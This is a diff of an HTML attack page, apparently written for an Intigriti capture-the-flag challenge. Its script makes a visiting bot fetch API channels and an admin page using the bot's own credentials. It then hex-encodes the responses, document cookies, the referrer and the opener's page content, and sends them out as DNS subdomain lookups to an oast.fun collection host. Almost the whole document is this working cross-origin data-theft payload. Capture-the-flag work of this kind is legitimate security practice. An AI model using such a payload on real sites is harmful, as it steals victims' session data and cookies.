@@ -1,41 +1,58 @@
 <!DOCTYPE html>
-<html><head><title>x</title></head>
+<html>
+<head><title>x</title></head>
 <body>
 <script>
-var o="da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
-function h(s){var r='';for(var i=0;i<s.length;i++)r+=s.charCodeAt(i).toString(16).padStart(2,'0');return r}
-function e(l,d){var x=h(d);var c=[];for(var i=0;i<x.length;i+=50)c.push(x.substring(i,i+50));for(var j=0;j<c.length;j++)new Image().src="http://"+l+"-"+j+"."+c[j]+"."+o+"/x";}
+const oast = "da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
 
-var base = "https://challenge-0826.challenges.intigriti.io";
-
-// Try fetching channels 11-20 from the challenge API with bot's credentials
-for (var ch = 11; ch <= 15; ch++) {
-    (function(n){
-        fetch(base + "/api/channels/" + n + "/load", {credentials:'include'})
-            .then(function(r){ return r.text(); })
-            .then(function(t){ e("ch"+n+"ok", t); })
-            .catch(function(ex){ e("ch"+n+"err", ex.toString().substring(0,50)); });
-    })(ch);
+function exfil(label, data) {
+    const hex = Array.from(new TextEncoder().encode(data)).map(b => b.toString(16).padStart(2,'0')).join('');
+    // Split into 50-char chunks for DNS labels
+    const chunks = hex.match(/.{1,50}/g) || ['empty'];
+    chunks.forEach((chunk, i) => {
+        new Image().src = `http://${label}-${i}-${chunk}.${oast}/x`;
+    });
 }
 
-// Also try channel 0 and some special ones
-fetch(base + "/api/channels/flag/load", {credentials:'include'})
-    .then(function(r){ return r.text(); })
-    .then(function(t){ e("chflagok", t); })
-    .catch(function(ex){ e("chflagerr", ex.toString().substring(0,50)); });
+// Try to fetch the challenge API (cross-origin to http://web/)
+// Use no-cors mode - request IS sent with cookies but response is opaque
+async function tryChannels() {
+    for (let ch = 11; ch <= 20; ch++) {
+        try {
+            // Try fetch with credentials
+            const r = await fetch(`http://web/api/channels/${ch}/load`, {
+                credentials: 'include',
+                mode: 'cors'
+            });
+            const text = await r.text();
+            exfil(`ch${ch}`, text);
+        } catch(e) {
+            // CORS blocked - try redirect approach
+        }
+    }
+    
+    // Try reading the opener's content if we were opened via window.open
+    try {
+        if (window.opener) {
+            exfil('opener', window.opener.document.body.innerHTML);
+        }
+    } catch(e) {}
+    
+    // Try reading history
+    exfil('info', `ref=${document.referrer}|hist=${history.length}|cookie=${document.cookie}`);
+    
+    // Try navigating to http://web/ and see if we can read it
+    // This won't work cross-origin but let's try
+    try {
+        const r2 = await fetch('http://web/', { credentials: 'include', mode: 'cors' });
+        const html = await r2.text();
+        exfil('admin', html.substring(0, 200));
+    } catch(e) {
+        exfil('adminerr', e.message.substring(0, 100));
+    }
+}
 
-// Read the cookie on the challenge domain via an img error handler
-// Actually, let's try fetching the challenge page and reading cookies from response
-fetch(base + "/challenge", {credentials:'include'})
-    .then(function(r){ 
-        e("chalstatus", r.status.toString());
-        return r.text(); 
-    })
-    .then(function(t){ e("chalbody", t.substring(0,100)); })
-    .catch(function(ex){ e("chalerr", ex.toString().substring(0,50)); });
-
-// Ping
-new Image().src = "http://v6ping." + o + "/";
+tryChannels();
 </script>
 </body>
 </html>
